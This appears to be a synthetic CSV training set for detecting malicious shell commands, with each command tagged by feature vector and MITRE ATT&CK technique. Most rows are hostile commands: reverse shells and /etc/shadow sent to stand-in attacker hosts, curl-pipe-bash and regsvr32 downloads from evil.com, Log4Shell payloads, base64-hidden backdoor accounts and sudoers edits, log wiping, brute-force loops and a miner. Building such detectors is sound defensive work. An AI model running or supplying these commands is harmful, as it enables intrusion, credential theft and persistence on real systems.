command,features,label,source
sudo echo 'ZG1lc2cgfCBncmVwIC1pICd2aXJ0dWFsXHx2bXdhcmVcfGt2bVx8eGVuJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ./ngrok tcp 22 & | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter']",synthetic
last -n 10 && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo perl -e 'use Socket; ...',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
cat /etc/pam.d/common-password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
echo 'Li9wd25raXQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP ; echo done,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1197_BITS_Jobs', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJzICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NDsgZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdhVzF3YjNKMElHOXonKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1140_Deobfuscate_Decode', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred -u /var/log/auth.log && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
systemd-detect-virt,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""openssl enc -aes-256-cbc -d -in /tmp/enc_payload -out /tmp/payload | echo done""","[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]","['T1140_Deobfuscate_Decode', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo locate *.pdf | xargs cp -t /tmp/loot/,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1005_Data_from_Local_System'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | chmod +x /tmp/payload,"[0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 1]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
find  /  -name  '*.pem'  2>/dev/null  |  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
Get-ADDefaultDomainPasswordPolicy,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
python3 exploit_rce.py --target http://10.0.0.1:8080/api ; > /dev/null 2>&1,"[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ping -c 1 -p 4142434445 attacker.com ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1095_Non_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
import -window root /tmp/screenshot.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1113_Screen_Capture'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
"socat TCP-LISTEN:8080,fork TCP:internal.target:80","[0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1090_Proxy'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
Get-ADDefaultDomainPasswordPolicy,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
echo 'c2FsdCAnKicgY21kLnJ1biAnY3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1072_Software_Deployment_Tools', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nmap -A -T4 192.168.1.0/24 && sleep 1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1047_Windows_Management_Instrumentation'],synthetic
time id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
msiexec /quiet /i http://evil.com/payload.msi && echo done,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup chmod 644 /etc/hosts &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time cp /bin/bash /tmp/sshd,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1036_Masquerading'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}' ; > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 eternalblue.py 10.0.0.5 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}' | history -c""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 eternalblue.py 10.0.0.5 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
"sudo bash -c 'python3 -c import os;os.system(""id"")'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
hping3 --icmp --data 1000 10.0.0.99,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
sudo echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
time cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'dyAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"gdb -p $(pgrep sshd) -batch -ex 'call system(""/tmp/payload"")'","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1055_Process_Injection'],synthetic
nohup msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run' &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo 'Li9DVkUtMjAyMS00MDM0ICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""sudo -u www-data bash ; sleep 1""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dyA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup top -bn1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import subprocess; [subprocess.run(l.strip(),shell=True) for l in open('/tmp/cmds')]""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
cat /proc/version | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""awk -F: '{print $1}' /etc/passwd | head -5""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['BENIGN'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"puppet apply -e 'exec { ""/tmp/malware"": }'","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1072_Software_Deployment_Tools'],synthetic
cat /tmp/encoded | xxd -r -p,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
sudo cat /etc/group ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup curl 'http://target.com/search?q=${jndi:ldap://attacker.com/a}' &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
find /tmp -name 'cmd_*' -exec bash {} \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
"bash -c ""echo 'Z25vbWUtc2NyZWVuc2hvdCAtZiAvdG1wL2dyYWIucG5n' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg query HKLM\SYSTEM\CurrentControlSet\Services ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1012_Query_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
who  &&  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
gnome-screenshot -f /tmp/grab.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
nbtscan 192.168.1.0/24 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'cHl0aG9uMyBldGVybmFsYmx1ZS5weSAxMC4wLjAuNQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Zm9yIHAgaW4gJChjYXQgcGFzc3dvcmRzLnR4dCk7IGRvIHNzaHBhc3MgLXAgJHAgc3NoIHJvb3RAMTAuMC4wLjEgaWQ7IGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Li9DVkUtMjAyMS00MDM0ICYmIGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
nohup ./ngrok tcp 22 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1219_Remote_Access_Software'],synthetic
time find / -name '*.docx' -exec cp {} /tmp/collected/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1119_Automated_Collection'],synthetic
Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP ; sleep 1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1197_BITS_Jobs', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sox -t alsa default /tmp/recording.wav trim 0 120,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
time bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'bmJ0c2NhbiAxOTIuMTY4LjEuMC8yNA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo sqlmap -u 'http://target.com/login?id=1' --dbs --batch ; echo done,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
"python3 -c ""from PIL import ImageGrab; ImageGrab.grab().save('/tmp/s.png')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1113_Screen_Capture'],synthetic
find  /root  -name  '*.key'  -exec  cp  {}  /tmp/  \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1005_Data_from_Local_System'],synthetic
cp /bin/bash /tmp/sshd,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1036_Masquerading'],synthetic
